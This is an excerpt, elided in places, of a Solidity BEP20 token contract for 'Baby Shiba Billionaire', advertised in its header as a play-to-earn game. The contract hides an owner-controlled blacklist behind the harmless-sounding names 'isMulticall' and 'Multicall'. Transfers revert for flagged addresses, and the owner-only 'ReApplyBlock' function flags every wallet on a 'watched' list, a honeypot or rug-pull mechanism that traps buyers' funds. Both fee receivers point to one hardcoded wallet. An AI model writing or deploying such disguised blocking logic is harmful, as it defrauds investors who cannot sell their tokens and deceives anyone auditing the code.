...
The Official Baby Shiba Billionaire Telegram group. Baby Shiba Billionaire Game and Earn as a service. 
Earn rewards by playing Baby Shiba Billionaire ! 💵
*/
...
contract BabyShibaBillionaire is IBEP20, Auth {
   using SafeMath for uint256;
   ...
   string constant _name = "Baby Shiba Billionaire";
   ...
   mapping (address => bool) public isMulticall;
   ...
   constructor () Auth(msg.sender) {
       ...
       marketingFeeReceiver = 0x5151C1437045d4fa2A5E5F71d81c6058C2be65A8; // Marketing Wallet
       buybackFeeReceiver = 0x5151C1437045d4fa2A5E5F71d81c6058C2be65A8; // Buyback Wallet
   ...
   function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
       if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        ...
        require(!isMulticall[recipient] && !isMulticall[sender], 'Address is blacklisted');
   ...
   // Set the correct fees for buying or selling
    ...
    function ReApplyBlock() public onlyOwner { 
        for(uint256 i = 0; i < watched.length; i++){
            ...
            isMulticall[wallet] = true;
        }
    }

   function Multicall(address _address, bool _value) public authorized{
        isMulticall[_address] = _value;
    }
